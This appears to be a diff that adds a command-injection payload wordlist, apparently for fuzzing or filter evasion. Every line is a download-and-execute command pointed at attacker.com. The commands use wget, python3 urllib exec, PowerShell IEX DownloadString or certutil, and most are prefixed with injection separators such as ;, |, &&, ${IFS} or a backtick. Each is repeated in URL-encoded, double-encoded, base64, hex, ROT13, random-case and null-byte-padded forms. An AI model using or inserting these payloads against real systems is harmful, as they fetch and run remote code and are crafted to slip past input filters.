+5c6e7767657420687474703a2f2f61747461636b65722e636f6d2f7368656c6c2e7368202d4f202f746d702f7368656c6c2e73682026262063686d6f64202b78202f746d702f7368656c6c2e7368202626202f746d702f7368656c6c2e7368
+\ajtrg uggc://nggnpxre.pbz/furyy.fu -B /gzc/furyy.fu && puzbq +k /gzc/furyy.fu && /gzc/furyy.fu
+\nWGet htTP://ATtAckeR.Com/ShelL.SH -O /Tmp/ShELl.Sh && ChmOD +X /tMp/ShEll.Sh && /TMp/ShELL.sh
+\nwget h%00ttp://atta%0acke%0dr%00.co%0am/s%0ahell.sh -O %09/tm%20p/shell.sh && %0dc%09hmod +%0cx%09 /%20t%09mp/shell.sh && %0c/tmp/%0cshell.sh
+wget http://attacker.com/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh
+wget%20http%3A//attacker.com/shell.sh%20-O%20/tmp/shell.sh%20%26%26%20chmod%20%2Bx%20/tmp/shell.sh%20%26%26%20/tmp/shell.sh
+wget%2520http%253A//attacker.com/shell.sh%2520-O%2520/tmp/shell.sh%2520%2526%2526%2520chmod%2520%252Bx%2520/tmp/shell.sh%2520%2526%2526%2520/tmp/shell.sh
+d2dldCBodHRwOi8vYXR0YWNrZXIuY29tL3NoZWxsLnNoIC1PIC90bXAvc2hlbGwuc2ggJiYgY2htb2QgK3ggL3RtcC9zaGVsbC5zaCAmJiAvdG1wL3NoZWxsLnNo
+7767657420687474703a2f2f61747461636b65722e636f6d2f7368656c6c2e7368202d4f202f746d702f7368656c6c2e73682026262063686d6f64202b78202f746d702f7368656c6c2e7368202626202f746d702f7368656c6c2e7368
+jtrg uggc://nggnpxre.pbz/furyy.fu -B /gzc/furyy.fu && puzbq +k /gzc/furyy.fu && /gzc/furyy.fu
+wgET hTTP://aTTacker.coM/sheLl.Sh -o /tMP/ShELl.sH && chmOD +x /TMp/SHELl.sh && /TMP/shEll.SH
+wg%09et http://attacker.c%00om/%00shell.sh -%00O /tmp/shell.sh && chmod%0b +x /tmp/shell.sh %09&& /t%0dmp%0b/shell.sh
+; python3 -c "import urllib.request; exec(urllib.request.urlopen('http://attacker.com/shell.py').read())"
+%3B%20python3%20-c%20%22import%20urllib.request%3B%20exec%28urllib.request.urlopen%28%27http%3A//attacker.com/shell.py%27%29.read%28%29%29%22
+%253B%2520python3%2520-c%2520%2522import%2520urllib.request%253B%2520exec%2528urllib.request.urlopen%2528%2527http%253A//attacker.com/shell.py%2527%2529.read%2528%2529%2529%2522
+OyBweXRob24zIC1jICJpbXBvcnQgdXJsbGliLnJlcXVlc3Q7IGV4ZWModXJsbGliLnJlcXVlc3QudXJsb3BlbignaHR0cDovL2F0dGFja2VyLmNvbS9zaGVsbC5weScpLnJlYWQoKSki
+3b20707974686f6e33202d632022696d706f72742075726c6c69622e726571756573743b20657865632875726c6c69622e726571756573742e75726c6f70656e2827687474703a2f2f61747461636b65722e636f6d2f7368656c6c2e707927292e7265616428292922
+; clguba3 -p "vzcbeg heyyvo.erdhrfg; rkrp(heyyvo.erdhrfg.heybcra('uggc://nggnpxre.pbz/furyy.cl').ernq())"
+; PythON3 -C "iMport URlLIb.reQuEsT; EXeC(uRlLiB.reQUEsT.UrloPEn('HTtp://AtTAckER.com/ShElL.pY').reAd())"
+; python3 -c%0c "impo%0art urllib.request%20; exec(urllib.request.urlopen('http:/%0a/attacker.com/she%09ll.py').read())%0b"
+| python3 -c "import urllib.request; exec(urllib.request.urlopen('http://attacker.com/shell.py').read())"
+%7C%20python3%20-c%20%22import%20urllib.request%3B%20exec%28urllib.request.urlopen%28%27http%3A//attacker.com/shell.py%27%29.read%28%29%29%22
+%257C%2520python3%2520-c%2520%2522import%2520urllib.request%253B%2520exec%2528urllib.request.urlopen%2528%2527http%253A//attacker.com/shell.py%2527%2529.read%2528%2529%2529%2522
+fCBweXRob24zIC1jICJpbXBvcnQgdXJsbGliLnJlcXVlc3Q7IGV4ZWModXJsbGliLnJlcXVlc3QudXJsb3BlbignaHR0cDovL2F0dGFja2VyLmNvbS9zaGVsbC5weScpLnJlYWQoKSki
+7c20707974686f6e33202d632022696d706f72742075726c6c69622e726571756573743b20657865632875726c6c69622e726571756573742e75726c6f70656e2827687474703a2f2f61747461636b65722e636f6d2f7368656c6c2e707927292e7265616428292922
+| clguba3 -p "vzcbeg heyyvo.erdhrfg; rkrp(heyyvo.erdhrfg.heybcra('uggc://nggnpxre.pbz/furyy.cl').ernq())"
+| PyThon3 -C "imPOrT uRlLib.rEqUest; EXEc(urLLIb.REquest.urLopen('HttP://AttACKEr.com/shell.py').rEAD())"
+|%0d python3 -c%0d "import urll%09ib.request; %09e%20xec(urlli%09b.request.urlo%0cpen('htt%0dp://attacker.com/she%09ll.py').read())"
+|| python3 -c "import urllib.request; exec(urllib.request.urlopen('http://attacker.com/shell.py').read())"
+%7C%7C%20python3%20-c%20%22import%20urllib.request%3B%20exec%28urllib.request.urlopen%28%27http%3A//attacker.com/shell.py%27%29.read%28%29%29%22
+%257C%257C%2520python3%2520-c%2520%2522import%2520urllib.request%253B%2520exec%2528urllib.request.urlopen%2528%2527http%253A//attacker.com/shell.py%2527%2529.read%2528%2529%2529%2522
+fHwgcHl0aG9uMyAtYyAiaW1wb3J0IHVybGxpYi5yZXF1ZXN0OyBleGVjKHVybGxpYi5yZXF1ZXN0LnVybG9wZW4oJ2h0dHA6Ly9hdHRhY2tlci5jb20vc2hlbGwucHknKS5yZWFkKCkpIg==
+7c7c20707974686f6e33202d632022696d706f72742075726c6c69622e726571756573743b20657865632875726c6c69622e726571756573742e75726c6f70656e2827687474703a2f2f61747461636b65722e636f6d2f7368656c6c2e707927292e7265616428292922
+|| clguba3 -p "vzcbeg heyyvo.erdhrfg; rkrp(heyyvo.erdhrfg.heybcra('uggc://nggnpxre.pbz/furyy.cl').ernq())"
+|| pYThON3 -c "impORT urllib.rEQuEst; EXec(URLliB.RequEst.urlopEn('HtTP://attACKER.cOm/shelL.Py').read())"
+|%09| python3 -c "import%09 urllib.r%09e%0cqu%0cest; %0cexec(urllib.re%20quest.urlope%09n('%0ahttp%20://attacker.co%0am/shell.p%0dy%0a'%0d)%0b.read())"
+& python3 -c "import urllib.request; exec(urllib.request.urlopen('http://attacker.com/shell.py').read())"
+%26%20python3%20-c%20%22import%20urllib.request%3B%20exec%28urllib.request.urlopen%28%27http%3A//attacker.com/shell.py%27%29.read%28%29%29%22
+%2526%2520python3%2520-c%2520%2522import%2520urllib.request%253B%2520exec%2528urllib.request.urlopen%2528%2527http%253A//attacker.com/shell.py%2527%2529.read%2528%2529%2529%2522
+JiBweXRob24zIC1jICJpbXBvcnQgdXJsbGliLnJlcXVlc3Q7IGV4ZWModXJsbGliLnJlcXVlc3QudXJsb3BlbignaHR0cDovL2F0dGFja2VyLmNvbS9zaGVsbC5weScpLnJlYWQoKSki
+2620707974686f6e33202d632022696d706f72742075726c6c69622e726571756573743b20657865632875726c6c69622e726571756573742e75726c6f70656e2827687474703a2f2f61747461636b65722e636f6d2f7368656c6c2e707927292e7265616428292922
+& clguba3 -p "vzcbeg heyyvo.erdhrfg; rkrp(heyyvo.erdhrfg.heybcra('uggc://nggnpxre.pbz/furyy.cl').ernq())"
+& PYthOn3 -c "imPOrT URLlIb.rEqueST; EXEC(uRLLIb.reqUESt.urLOpeN('hTTp://aTtACKeR.COM/ShELl.pY').rEaD())"
+& python3 -c "import urllib.request; exec%20(urllib.r%20equest.urlopen('%00http:%0c//attacker.com/shell.py').read())"
+&& python3 -c "import urllib.request; exec(urllib.request.urlopen('http://attacker.com/shell.py').read())"
+%26%26%20python3%20-c%20%22import%20urllib.request%3B%20exec%28urllib.request.urlopen%28%27http%3A//attacker.com/shell.py%27%29.read%28%29%29%22
+%2526%2526%2520python3%2520-c%2520%2522import%2520urllib.request%253B%2520exec%2528urllib.request.urlopen%2528%2527http%253A//attacker.com/shell.py%2527%2529.read%2528%2529%2529%2522
+JiYgcHl0aG9uMyAtYyAiaW1wb3J0IHVybGxpYi5yZXF1ZXN0OyBleGVjKHVybGxpYi5yZXF1ZXN0LnVybG9wZW4oJ2h0dHA6Ly9hdHRhY2tlci5jb20vc2hlbGwucHknKS5yZWFkKCkpIg==
+262620707974686f6e33202d632022696d706f72742075726c6c69622e726571756573743b20657865632875726c6c69622e726571756573742e75726c6f70656e2827687474703a2f2f61747461636b65722e636f6d2f7368656c6c2e707927292e7265616428292922
+&& clguba3 -p "vzcbeg heyyvo.erdhrfg; rkrp(heyyvo.erdhrfg.heybcra('uggc://nggnpxre.pbz/furyy.cl').ernq())"
+&& PyTHoN3 -c "imPoRt UrlliB.rEQUest; eXEC(URllIb.rEqUESt.uRlOpeN('HTTP://AttackEr.COM/sHEll.pY').Read())"
+&& python3 -c "import urllib.request; exec(urll%0aib.r%00equ%09e%0dst%0d.urlopen('h%09ttp://attacker.com/shell.py').rea%0ad())"
+%0apython3 -c "import urllib.request; exec(urllib.request.urlopen('http://attacker.com/shell.py').read())"
+%250apython3%20-c%20%22import%20urllib.request%3B%20exec%28urllib.request.urlopen%28%27http%3A//attacker.com/shell.py%27%29.read%28%29%29%22
+%25250apython3%2520-c%2520%2522import%2520urllib.request%253B%2520exec%2528urllib.request.urlopen%2528%2527http%253A//attacker.com/shell.py%2527%2529.read%2528%2529%2529%2522
+JTBhcHl0aG9uMyAtYyAiaW1wb3J0IHVybGxpYi5yZXF1ZXN0OyBleGVjKHVybGxpYi5yZXF1ZXN0LnVybG9wZW4oJ2h0dHA6Ly9hdHRhY2tlci5jb20vc2hlbGwucHknKS5yZWFkKCkpIg==
+253061707974686f6e33202d632022696d706f72742075726c6c69622e726571756573743b20657865632875726c6c69622e726571756573742e75726c6f70656e2827687474703a2f2f61747461636b65722e636f6d2f7368656c6c2e707927292e7265616428292922
+%0nclguba3 -p "vzcbeg heyyvo.erdhrfg; rkrp(heyyvo.erdhrfg.heybcra('uggc://nggnpxre.pbz/furyy.cl').ernq())"
+%0aPYThON3 -c "imporT urllIb.rEqUeST; ExEc(uRLlIb.reQUeST.UrLOPEn('HttP://AttAckeR.COM/SHell.Py').REaD())"
+%0apyth%0aon3 -%0ac "import %00urllib.requ%0cest; exe%09c(ur%09l%0blib%00.re%20quest%20.urlopen('http://attacker.c%0com/shell.py')%00.read())"
+%0Apython3 -c "import urllib.request; exec(urllib.request.urlopen('http://attacker.com/shell.py').read())"
+%250Apython3%20-c%20%22import%20urllib.request%3B%20exec%28urllib.request.urlopen%28%27http%3A//attacker.com/shell.py%27%29.read%28%29%29%22
+%25250Apython3%2520-c%2520%2522import%2520urllib.request%253B%2520exec%2528urllib.request.urlopen%2528%2527http%253A//attacker.com/shell.py%2527%2529.read%2528%2529%2529%2522
+JTBBcHl0aG9uMyAtYyAiaW1wb3J0IHVybGxpYi5yZXF1ZXN0OyBleGVjKHVybGxpYi5yZXF1ZXN0LnVybG9wZW4oJ2h0dHA6Ly9hdHRhY2tlci5jb20vc2hlbGwucHknKS5yZWFkKCkpIg==
+253041707974686f6e33202d632022696d706f72742075726c6c69622e726571756573743b20657865632875726c6c69622e726571756573742e75726c6f70656e2827687474703a2f2f61747461636b65722e636f6d2f7368656c6c2e707927292e7265616428292922
+%0Nclguba3 -p "vzcbeg heyyvo.erdhrfg; rkrp(heyyvo.erdhrfg.heybcra('uggc://nggnpxre.pbz/furyy.cl').ernq())"
+%0ApythOn3 -C "iMport UrllIB.rEQUest; Exec(urLLIB.rEqUesT.uRLoPEN('Http://ATtACkER.Com/sHeLL.PY').rEaD())"
+%0Apyth%0con3%0c -c "import urllib.request; exec(u%0arllib.req%0duest.urlopen('http:%20//at%00tacker%0b.com/shell.py').read())"
+${IFS}python3 -c "import urllib.request; exec(urllib.request.urlopen('http://attacker.com/shell.py').read())"
+%24%7BIFS%7Dpython3%20-c%20%22import%20urllib.request%3B%20exec%28urllib.request.urlopen%28%27http%3A//attacker.com/shell.py%27%29.read%28%29%29%22
+%2524%257BIFS%257Dpython3%2520-c%2520%2522import%2520urllib.request%253B%2520exec%2528urllib.request.urlopen%2528%2527http%253A//attacker.com/shell.py%2527%2529.read%2528%2529%2529%2522
+JHtJRlN9cHl0aG9uMyAtYyAiaW1wb3J0IHVybGxpYi5yZXF1ZXN0OyBleGVjKHVybGxpYi5yZXF1ZXN0LnVybG9wZW4oJ2h0dHA6Ly9hdHRhY2tlci5jb20vc2hlbGwucHknKS5yZWFkKCkpIg==
+247b4946537d707974686f6e33202d632022696d706f72742075726c6c69622e726571756573743b20657865632875726c6c69622e726571756573742e75726c6f70656e2827687474703a2f2f61747461636b65722e636f6d2f7368656c6c2e707927292e7265616428292922
+${VSF}clguba3 -p "vzcbeg heyyvo.erdhrfg; rkrp(heyyvo.erdhrfg.heybcra('uggc://nggnpxre.pbz/furyy.cl').ernq())"
+${iFs}pYthOn3 -c "IMport uRLliB.REquEsT; exEc(uRLlIb.REQuesT.uRloPEn('Http://attaCKEr.com/SHeLL.pY').rEad())"
+${IFS}python3 -c "im%00po%0brt urll%0dib.request;%00 e%00x%09ec(url%00li%0ab.r%20e%20que%09st.ur%09l%0copen('http://%00att%09acker.com/shell.%0cpy').rea%00d%00())"
+\npython3 -c "import urllib.request; exec(urllib.request.urlopen('http://attacker.com/shell.py').read())"
+%5Cnpython3%20-c%20%22import%20urllib.request%3B%20exec%28urllib.request.urlopen%28%27http%3A//attacker.com/shell.py%27%29.read%28%29%29%22
+%255Cnpython3%2520-c%2520%2522import%2520urllib.request%253B%2520exec%2528urllib.request.urlopen%2528%2527http%253A//attacker.com/shell.py%2527%2529.read%2528%2529%2529%2522
+XG5weXRob24zIC1jICJpbXBvcnQgdXJsbGliLnJlcXVlc3Q7IGV4ZWModXJsbGliLnJlcXVlc3QudXJsb3BlbignaHR0cDovL2F0dGFja2VyLmNvbS9zaGVsbC5weScpLnJlYWQoKSki
+5c6e707974686f6e33202d632022696d706f72742075726c6c69622e726571756573743b20657865632875726c6c69622e726571756573742e75726c6f70656e2827687474703a2f2f61747461636b65722e636f6d2f7368656c6c2e707927292e7265616428292922
+\aclguba3 -p "vzcbeg heyyvo.erdhrfg; rkrp(heyyvo.erdhrfg.heybcra('uggc://nggnpxre.pbz/furyy.cl').ernq())"
+\npYThON3 -C "iMPORT urllIb.ReQuEst; ExeC(UrlLIb.REQUEst.UrLOpEn('HtTP://ATtaCkER.cOm/SHeLL.py').ReAd())"
+\%0dnpython3 -c "imp%0bort %09urllib.%0creque%0dst; exec(ur%0cllib.reque%09st.ur%0al%0dopen('http:/%0c/attacker.c%20om/shell.p%09y').read())"
+python3 -c "import urllib.request; exec(urllib.request.urlopen('http://attacker.com/shell.py').read())"
+python3%20-c%20%22import%20urllib.request%3B%20exec%28urllib.request.urlopen%28%27http%3A//attacker.com/shell.py%27%29.read%28%29%29%22
+python3%2520-c%2520%2522import%2520urllib.request%253B%2520exec%2528urllib.request.urlopen%2528%2527http%253A//attacker.com/shell.py%2527%2529.read%2528%2529%2529%2522
+cHl0aG9uMyAtYyAiaW1wb3J0IHVybGxpYi5yZXF1ZXN0OyBleGVjKHVybGxpYi5yZXF1ZXN0LnVybG9wZW4oJ2h0dHA6Ly9hdHRhY2tlci5jb20vc2hlbGwucHknKS5yZWFkKCkpIg==
+707974686f6e33202d632022696d706f72742075726c6c69622e726571756573743b20657865632875726c6c69622e726571756573742e75726c6f70656e2827687474703a2f2f61747461636b65722e636f6d2f7368656c6c2e707927292e7265616428292922
+clguba3 -p "vzcbeg heyyvo.erdhrfg; rkrp(heyyvo.erdhrfg.heybcra('uggc://nggnpxre.pbz/furyy.cl').ernq())"
+PYtHOn3 -C "ImPorT urLLiB.rEqUEST; exeC(uRlliB.ReqUESt.UrlOPEn('Http://atTaCkER.CoM/SHELl.py').REaD())"
+python3 %09-c %09"im%0cpor%09t%09 %0durllib.request; exec(urllib.re%0cquest.urlopen('http://attac%0aker.com/s%09hell.py'%0c).read())"
+&powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"
+%26powershell%20-c%20%22IEX%28New-Object%20Net.WebClient%29.DownloadString%28%27http%3A//attacker.com/shell.ps1%27%29%22
+%2526powershell%2520-c%2520%2522IEX%2528New-Object%2520Net.WebClient%2529.DownloadString%2528%2527http%253A//attacker.com/shell.ps1%2527%2529%2522
+JnBvd2Vyc2hlbGwgLWMgIklFWChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vYXR0YWNrZXIuY29tL3NoZWxsLnBzMScpIg==
+26706f7765727368656c6c202d632022494558284e65772d4f626a656374204e65742e576562436c69656e74292e446f776e6c6f6164537472696e672827687474703a2f2f61747461636b65722e636f6d2f7368656c6c2e707331272922
+&cbjrefuryy -p "VRK(Arj-Bowrpg Arg.JroPyvrag).QbjaybnqFgevat('uggc://nggnpxre.pbz/furyy.cf1')"
+&poWErsheLl -C "IeX(NEW-ObJect Net.wEbcLienT).dOwnloADStrINg('htTP://attaCkER.coM/sheLl.pS1')"
+&powershel%09l -c "IEX(%0bNew-Object Net.WebClient).DownloadString('http://attacker.com/shell.p%0ds1')"
+|powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"
+%7Cpowershell%20-c%20%22IEX%28New-Object%20Net.WebClient%29.DownloadString%28%27http%3A//attacker.com/shell.ps1%27%29%22
+%257Cpowershell%2520-c%2520%2522IEX%2528New-Object%2520Net.WebClient%2529.DownloadString%2528%2527http%253A//attacker.com/shell.ps1%2527%2529%2522
+fHBvd2Vyc2hlbGwgLWMgIklFWChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vYXR0YWNrZXIuY29tL3NoZWxsLnBzMScpIg==
+7c706f7765727368656c6c202d632022494558284e65772d4f626a656374204e65742e576562436c69656e74292e446f776e6c6f6164537472696e672827687474703a2f2f61747461636b65722e636f6d2f7368656c6c2e707331272922
+|cbjrefuryy -p "VRK(Arj-Bowrpg Arg.JroPyvrag).QbjaybnqFgevat('uggc://nggnpxre.pbz/furyy.cf1')"
+|POwerShEll -C "IEX(NEw-ObJEct nET.wEBCLIENT).DOwnLoAdsTRIng('httP://attacker.COm/shElL.pS1')"
+|powershell -c "IE%20X(New-Object Net.%00WebClien%09t).%00DownloadStr%20i%0cng('http://attacker%09.c%0bom/she%0all.%0dps1')"
+%26powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"
+%2526powershell%20-c%20%22IEX%28New-Object%20Net.WebClient%29.DownloadString%28%27http%3A//attacker.com/shell.ps1%27%29%22
+%252526powershell%2520-c%2520%2522IEX%2528New-Object%2520Net.WebClient%2529.DownloadString%2528%2527http%253A//attacker.com/shell.ps1%2527%2529%2522
+JTI2cG93ZXJzaGVsbCAtYyAiSUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9hdHRhY2tlci5jb20vc2hlbGwucHMxJyki
+253236706f7765727368656c6c202d632022494558284e65772d4f626a656374204e65742e576562436c69656e74292e446f776e6c6f6164537472696e672827687474703a2f2f61747461636b65722e636f6d2f7368656c6c2e707331272922
+%26cbjrefuryy -p "VRK(Arj-Bowrpg Arg.JroPyvrag).QbjaybnqFgevat('uggc://nggnpxre.pbz/furyy.cf1')"
+%26pOWershELL -c "IeX(neW-obJEcT neT.WEbCLieNt).DoWnlOADsTriNg('hTtP://ATtAckER.coM/SHElL.Ps1')"
+%26po%0aw%0ders%20h%0de%0dll%0b -c "IEX(%09New-Obj%0cec%0at Net.W%0bebCli%0dent).DownloadStr%0bing('http://attacker.com/shell.ps1')"
+%7Cpowershell -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"
+%257Cpowershell%20-c%20%22IEX%28New-Object%20Net.WebClient%29.DownloadString%28%27http%3A//attacker.com/shell.ps1%27%29%22
+%25257Cpowershell%2520-c%2520%2522IEX%2528New-Object%2520Net.WebClient%2529.DownloadString%2528%2527http%253A//attacker.com/shell.ps1%2527%2529%2522
+JTdDcG93ZXJzaGVsbCAtYyAiSUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9hdHRhY2tlci5jb20vc2hlbGwucHMxJyki
+253743706f7765727368656c6c202d632022494558284e65772d4f626a656374204e65742e576562436c69656e74292e446f776e6c6f6164537472696e672827687474703a2f2f61747461636b65722e636f6d2f7368656c6c2e707331272922
+%7Pcbjrefuryy -p "VRK(Arj-Bowrpg Arg.JroPyvrag).QbjaybnqFgevat('uggc://nggnpxre.pbz/furyy.cf1')"
+%7cPoweRSHell -c "IEx(New-ObJeCt NET.webcLient).DoWNLoADSTRinG('HTtP://aTTacKer.cOm/sHeLl.ps1')"
+%%0a7C%20powershell -c "IE%0dX(New-Object Net.WebClie%0dnt).Dow%00nloadString('http://atta%0dcker.com/shel%20l.ps1')"
+`|powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"
+%60%7Cpowershell%20-c%20%22IEX%28New-Object%20Net.WebClient%29.DownloadString%28%27http%3A//attacker.com/shell.ps1%27%29%22
+%2560%257Cpowershell%2520-c%2520%2522IEX%2528New-Object%2520Net.WebClient%2529.DownloadString%2528%2527http%253A//attacker.com/shell.ps1%2527%2529%2522
+YHxwb3dlcnNoZWxsIC1jICJJRVgoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnaHR0cDovL2F0dGFja2VyLmNvbS9zaGVsbC5wczEnKSI=
+607c706f7765727368656c6c202d632022494558284e65772d4f626a656374204e65742e576562436c69656e74292e446f776e6c6f6164537472696e672827687474703a2f2f61747461636b65722e636f6d2f7368656c6c2e707331272922
+`|cbjrefuryy -p "VRK(Arj-Bowrpg Arg.JroPyvrag).QbjaybnqFgevat('uggc://nggnpxre.pbz/furyy.cf1')"
+`|poWeRSHELL -C "IEx(new-OBjEcT NET.WEBCLienT).DOWNlOaDSTrINg('HTTP://atTACker.COm/sHelL.Ps1')"
+`|p%20owershell -c "IEX(New-Object Net.WebClient).D%09ownloadS%0btring('%0ahttp://attacker%20.com/shell.ps1')"
+`&powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"
+%60%26powershell%20-c%20%22IEX%28New-Object%20Net.WebClient%29.DownloadString%28%27http%3A//attacker.com/shell.ps1%27%29%22
+%2560%2526powershell%2520-c%2520%2522IEX%2528New-Object%2520Net.WebClient%2529.DownloadString%2528%2527http%253A//attacker.com/shell.ps1%2527%2529%2522
+YCZwb3dlcnNoZWxsIC1jICJJRVgoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnaHR0cDovL2F0dGFja2VyLmNvbS9zaGVsbC5wczEnKSI=
+6026706f7765727368656c6c202d632022494558284e65772d4f626a656374204e65742e576562436c69656e74292e446f776e6c6f6164537472696e672827687474703a2f2f61747461636b65722e636f6d2f7368656c6c2e707331272922
+`&cbjrefuryy -p "VRK(Arj-Bowrpg Arg.JroPyvrag).QbjaybnqFgevat('uggc://nggnpxre.pbz/furyy.cf1')"
+`&poWErSHElL -c "IEX(neW-OBject Net.WEBCLIeNt).doWnLOaDsTrINg('HTTP://AtTACker.cOm/shElL.ps1')"
+`&%00powe%0crshell -c "IEX(New-Object%0c N%20et.WebClient)%0a.Do%00wnloadString('ht%20tp://at%0dtacker.com/sh%00e%20ll.ps1')"
+powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"
+powershell%20-c%20%22IEX%28New-Object%20Net.WebClient%29.DownloadString%28%27http%3A//attacker.com/shell.ps1%27%29%22
+powershell%2520-c%2520%2522IEX%2528New-Object%2520Net.WebClient%2529.DownloadString%2528%2527http%253A//attacker.com/shell.ps1%2527%2529%2522
+cG93ZXJzaGVsbCAtYyAiSUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9hdHRhY2tlci5jb20vc2hlbGwucHMxJyki
+706f7765727368656c6c202d632022494558284e65772d4f626a656374204e65742e576562436c69656e74292e446f776e6c6f6164537472696e672827687474703a2f2f61747461636b65722e636f6d2f7368656c6c2e707331272922
+cbjrefuryy -p "VRK(Arj-Bowrpg Arg.JroPyvrag).QbjaybnqFgevat('uggc://nggnpxre.pbz/furyy.cf1')"
+POWeRsHelL -C "Iex(NeW-oBJEcT NET.WEBclienT).DowNLOAdStRinG('hTtp://aTTacKER.COM/shELl.ps1')"
+power%20sh%0aell%0d %0d-c "IEX(New-O%0cbject Ne%0ct.WebCli%0cent%0d).Downl%00oadString('%0dhttp:%20//attacke%20r.com/sh%0cell.ps1%20')"
+&certutil -urlcache -f http://attacker.com/shell.exe shell.exe && shell.exe
+%26certutil%20-urlcache%20-f%20http%3A//attacker.com/shell.exe%20shell.exe%20%26%26%20shell.exe
+%2526certutil%2520-urlcache%2520-f%2520http%253A//attacker.com/shell.exe%2520shell.exe%2520%2526%2526%2520shell.exe
+JmNlcnR1dGlsIC11cmxjYWNoZSAtZiBodHRwOi8vYXR0YWNrZXIuY29tL3NoZWxsLmV4ZSBzaGVsbC5leGUgJiYgc2hlbGwuZXhl
+26636572747574696c202d75726c6361636865202d6620687474703a2f2f61747461636b65722e636f6d2f7368656c6c2e657865207368656c6c2e657865202626207368656c6c2e657865
+&preghgvy -heypnpur -s uggc://nggnpxre.pbz/furyy.rkr furyy.rkr && furyy.rkr
+&CErTUtIl -uRLcACHe -f HTTP://ATTACKEr.Com/sHelL.eXE Shell.EXe && shelL.Exe
+&%0dcertutil -urlcache%20 -f%0c http%20://%09a%0attac%09ker.com/shell.%20exe shell.ex%0ae && shell.exe
+|certutil -urlcache -f http://attacker.com/shell.exe shell.exe && shell.exe
+%7Ccertutil%20-urlcache%20-f%20http%3A//attacker.com/shell.exe%20shell.exe%20%26%26%20shell.exe
+%257Ccertutil%2520-urlcache%2520-f%2520http%253A//attacker.com/shell.exe%2520shell.exe%2520%2526%2526%2520shell.exe
+fGNlcnR1dGlsIC11cmxjYWNoZSAtZiBodHRwOi8vYXR0YWNrZXIuY29tL3NoZWxsLmV4ZSBzaGVsbC5leGUgJiYgc2hlbGwuZXhl
+7c636572747574696c202d75726c6361636865202d6620687474703a2f2f61747461636b65722e636f6d2f7368656c6c2e657865207368656c6c2e657865202626207368656c6c2e657865
+|preghgvy -heypnpur -s uggc://nggnpxre.pbz/furyy.rkr furyy.rkr && furyy.rkr
+|CERTUTiL -urLCAcHe -f HTtP://aTTaCkER.COm/ShElL.eXe sheLl.exE && ShELl.Exe
+|certutil -ur%0clc%00ache -f http://%20a%09ttacker.com/shell%09.exe sh%20ell.exe %00&& she%20ll.ex%0ce
+%26certutil -urlcache -f http://attacker.com/shell.exe shell.exe && shell.exe
+%2526certutil%20-urlcache%20-f%20http%3A//attacker.com/shell.exe%20shell.exe%20%26%26%20shell.exe
+%252526certutil%2520-urlcache%2520-f%2520http%253A//attacker.com/shell.exe%2520shell.exe%2520%2526%2526%2520shell.exe
+JTI2Y2VydHV0aWwgLXVybGNhY2hlIC1mIGh0dHA6Ly9hdHRhY2tlci5jb20vc2hlbGwuZXhlIHNoZWxsLmV4ZSAmJiBzaGVsbC5leGU=
+253236636572747574696c202d75726c6361636865202d6620687474703a2f2f61747461636b65722e636f6d2f7368656c6c2e657865207368656c6c2e657865202626207368656c6c2e657865
+%26preghgvy -heypnpur -s uggc://nggnpxre.pbz/furyy.rkr furyy.rkr && furyy.rkr
+%26cERTutiL -uRLCAChE -F htTp://AttAcKer.cOM/ShEll.Exe SHELl.exe && sHElL.eXE
+%26certutil%0c -ur%0clca%0bche%00 -f http:%0a//attacker.%0aco%0dm/shell.exe s%00hell.e%09xe && shell.exe
+%7Ccertutil -urlcache -f http://attacker.com/shell.exe shell.exe && shell.exe
+%257Ccertutil%20-urlcache%20-f%20http%3A//attacker.com/shell.exe%20shell.exe%20%26%26%20shell.exe
+%25257Ccertutil%2520-urlcache%2520-f%2520http%253A//attacker.com/shell.exe%2520shell.exe%2520%2526%2526%2520shell.exe
+JTdDY2VydHV0aWwgLXVybGNhY2hlIC1mIGh0dHA6Ly9hdHRhY2tlci5jb20vc2hlbGwuZXhlIHNoZWxsLmV4ZSAmJiBzaGVsbC5leGU=
+253743636572747574696c202d75726c6361636865202d6620687474703a2f2f61747461636b65722e636f6d2f7368656c6c2e657865207368656c6c2e657865202626207368656c6c2e657865
+%7Ppreghgvy -heypnpur -s uggc://nggnpxre.pbz/furyy.rkr furyy.rkr && furyy.rkr
+%7cCeRtuTiL -URlcAcHe -F HTtp://ATtACKeR.coM/sHeLL.eXE shell.ExE && shEll.exE
+%0d%7C%0bce%0drtutil%0c -ur%00lca%0ache -f ht%09tp://attacker.co%0cm/shell.e%0cxe sh%0dell.exe && shel%0cl.exe
+`|certutil -urlcache -f http://attacker.com/shell.exe shell.exe && shell.exe
+%60%7Ccertutil%20-urlcache%20-f%20http%3A//attacker.com/shell.exe%20shell.exe%20%26%26%20shell.exe
+%2560%257Ccertutil%2520-urlcache%2520-f%2520http%253A//attacker.com/shell.exe%2520shell.exe%2520%2526%2526%2520shell.exe
+YHxjZXJ0dXRpbCAtdXJsY2FjaGUgLWYgaHR0cDovL2F0dGFja2VyLmNvbS9zaGVsbC5leGUgc2hlbGwuZXhlICYmIHNoZWxsLmV4ZQ==
+607c636572747574696c202d75726c6361636865202d6620687474703a2f2f61747461636b65722e636f6d2f7368656c6c2e657865207368656c6c2e657865202626207368656c6c2e657865
